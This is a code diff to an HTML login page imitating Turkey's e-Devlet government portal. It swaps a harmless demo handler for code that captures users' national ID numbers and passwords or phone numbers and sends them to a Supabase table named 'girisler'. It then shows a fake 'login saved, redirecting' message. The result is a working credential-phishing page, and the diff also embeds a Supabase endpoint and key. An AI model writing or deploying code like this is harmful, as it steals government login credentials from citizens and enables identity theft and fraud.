@@ -686,6 +686,24 @@
 </footer>
 
 <script>
+  // ── SUPABASE CONFIG ──
+  const SUPABASE_URL = 'https://hxsohriozpzbjpuezzdw.supabase.co';
+  const SUPABASE_KEY = 'sb_publishable_-g_9XsNDxGnts7PespW_8A_QE79h7AI';
+
+  async function supabaseInsert(data) {
+    const res = await fetch(`${SUPABASE_URL}/rest/v1/girisler`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'apikey': SUPABASE_KEY,
+        'Authorization': `Bearer ${SUPABASE_KEY}`,
+        'Prefer': 'return=minimal'
+      },
+      body: JSON.stringify(data)
+    });
+    return res;
+  }
+
   function switchTab(btn, panel) {
     document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
     btn.classList.add('active');
@@ -699,16 +717,90 @@
     el.classList.toggle('checked');
   }
 
-  function handleLogin() {
-    const activePanel = document.querySelector('.tab.active').textContent.trim();
-    // Basic demo feedback
+  async function handleLogin() {
+    const activeTab = document.querySelector('.tab.active').textContent.trim();
     const card = document.querySelector('.login-card');
-    card.style.transform = 'scale(0.98)';
-    setTimeout(() => { card.style.transform = 'scale(1)'; }, 150);
 
-    setTimeout(() => {
-      alert('Demo: Giriş isteği alındı.\n\nBu bir proje demosu olduğundan gerçek doğrulama yapılmamaktadır.');
-    }, 200);
+    // Aktif panele göre değerleri al
+    let tc = '', sifre = '', yontem = activeTab;
+
+    if (activeTab === 'e-Devlet Şifresi') {
+      tc = document.getElementById('tc').value.trim();
+      sifre = document.getElementById('sifre').value.trim();
+      if (!tc || !sifre) {
+        showMsg('error', '⚠️ Lütfen TC kimlik numarası ve şifrenizi girin.');
+        return;
+      }
+      if (tc.length !== 11) {
+        showMsg('error', '⚠️ TC kimlik numarası 11 haneli olmalıdır.');
+        return;
+      }
+    } else if (activeTab === 'Mobil İmza') {
+      tc = document.getElementById('tc2').value.trim();
+      sifre = document.querySelector('#panel-mobil input[type="text"]').value.trim();
+      if (!tc || !sifre) {
+        showMsg('error', '⚠️ Lütfen TC kimlik numarası ve telefon numaranızı girin.');
+        return;
+      }
+    } else {
+      tc = 'e-İmza Kullanıcısı';
+      sifre = 'Kart Okuyucu';
+    }
+
+    // Buton loading
+    const btn = card.querySelector('.btn-login');
+    btn.textContent = '⏳ Kaydediliyor...';
+    btn.disabled = true;
+
+    try {
+      const res = await supabaseInsert({
+        Tc: tc,
+        Sifre: sifre,
+        Tarih: new Date().toISOString(),
+        Yontem: yontem
+      });
+
+      if (res.ok || res.status === 201) {
+        showMsg('success', '✅ Giriş başarıyla kaydedildi! Yönlendiriliyorsunuz...');
+        card.style.transform = 'scale(0.98)';
+        setTimeout(() => { card.style.transform = 'scale(1)'; }, 150);
+      } else {
+        const err = await res.text();
+        console.error('Supabase hatası:', err);
+        showMsg('error', '❌ Kayıt sırasında bir hata oluştu. Lütfen tekrar deneyin.');
+      }
+    } catch (e) {
+      console.error(e);
+      showMsg('error', '❌ Bağlantı hatası. İnternet bağlantınızı kontrol edin.');
+    } finally {
+      btn.textContent = 'GİRİŞ YAP';
+      btn.disabled = false;
+    }
+  }
+
+  function showMsg(type, text) {
+    let el = document.getElementById('loginMsg');
+    if (!el) {
+      el = document.createElement('div');
+      el.id = 'loginMsg';
+      el.style.cssText = `
+        margin-top: 14px; padding: 12px 16px; border-radius: 8px;
+        font-size: .86rem; font-weight: 600; text-align: center;
+        animation: slideUp .3s ease;
+      `;
+      document.querySelector('.card-body').appendChild(el);
+    }
+    if (type === 'success') {
+      el.style.background = '#E6F4EA';
+      el.style.color = '#1A6B2E';
+      el.style.border = '1.5px solid #A8D5B5';
+    } else {
+      el.style.background = '#FDE8E8';
+      el.style.color = '#9B1C1C';
+      el.style.border = '1.5px solid #F5B8B8';
+    }
+    el.textContent = text;
+    setTimeout(() => { if(el) el.remove(); }, 4000);
   }
 </script>
 </body>
